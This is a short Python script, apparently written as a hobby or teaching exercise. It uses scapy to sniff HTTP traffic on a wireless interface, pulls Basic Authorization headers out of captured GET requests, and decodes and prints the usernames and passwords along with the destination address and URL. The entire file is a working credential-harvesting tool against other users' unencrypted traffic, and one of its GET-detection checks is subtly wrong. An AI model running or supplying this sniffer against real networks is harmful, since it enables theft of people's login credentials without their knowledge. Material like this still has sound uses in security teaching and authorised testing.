import base64
import os
from scapy.all import *
#find the GET request then pass parameters to function for processing and printing(if any)
def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
          if packet.haslayer(Raw):
            string=str(packet.getlayer(Raw))
            url=string.split(r"\r\n")[0].split(" ")[1]
            if packet.haslayer(IP):
              find_and_decode(packet,packet.getlayer(IP).dst,url)
            else:
              find_and_decode(packet)
#decode basic auth using base64 after parsing
#used a temporary file to make line reading easier
def find_and_decode(packet,ip_addr=None,url=None):
    file=open("tmp.txt","w")
    file.write(GET_print(packet))
    file.close()
    file=open("tmp.txt","r")
    for line in file:
      if "Authorization" in line:
        encoded=line.split(" ")[2]
        print("Found credentials, decoding...")
        decoded=base64.b64decode(encoded).decode()#decode using base64, result will be in byte so use decode() to convert to str
        usr,passwd=decoded.split(":")
        print("Username:%s,password:%s"%(usr,passwd))
        if ip_addr!=None and url!=None:
          print("resource is %s%s"%(ip_addr,url))
    file.close()
    os.remove("tmp.txt")
#process the string for better parsing
def GET_print(packet1):
    ret="\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    if "\r\n\r\n" in ret:
      ret=ret.replace("\r\n\r\n","")
    return ret
sniff(iface='wlan0',prn=http_header,filter="tcp port 80")
